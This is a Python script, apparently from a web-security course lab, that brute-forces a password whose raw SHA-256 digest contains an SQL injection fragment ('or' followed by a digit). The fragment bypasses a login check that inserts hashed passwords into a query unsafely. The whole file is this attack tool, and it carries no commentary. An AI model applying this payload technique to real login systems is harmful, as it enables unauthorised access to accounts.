from curses.ascii import isdigit
from hashlib import sha256
import string
import random

def get_random_string(length):
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

sql1 = "'or'"
sql2 = "'oR'"
sql3 = "'Or'"
sql4 = "'OR'"


test_pass_bytes = "bungle-"
changed_int = 1
final_bytes = ""


while 1==1:
    # randomString = get_random_string(8)
    test_digest = sha256((test_pass_bytes + str(changed_int)).encode("latin-1")).digest().decode("latin-1")

    first_index = test_digest.find(sql1)
    if (first_index+4 < len(test_digest)):
        if (first_index != -1 and (test_digest[first_index+4]).isdecimal()):
            final_bytes = test_pass_bytes + str(changed_int)
            break

    first_index = test_digest.find(sql2)
    if (first_index+4 < len(test_digest)):
        if (first_index != -1 and (test_digest[first_index+4]).isdecimal()):
            final_bytes = test_pass_bytes + str(changed_int)
            break

    first_index = test_digest.find(sql3)
    if (first_index+4 < len(test_digest)):
        if (first_index != -1 and (test_digest[first_index+4]).isdecimal()):
            final_bytes = test_pass_bytes + str(changed_int)
            break


    first_index = test_digest.find(sql4)
    if (first_index+4 < len(test_digest)):
        if (first_index != -1 and (test_digest[first_index+4]).isdecimal()):
            final_bytes = test_pass_bytes + str(changed_int)
            break

    changed_int += 1

print(test_digest)
print(final_bytes)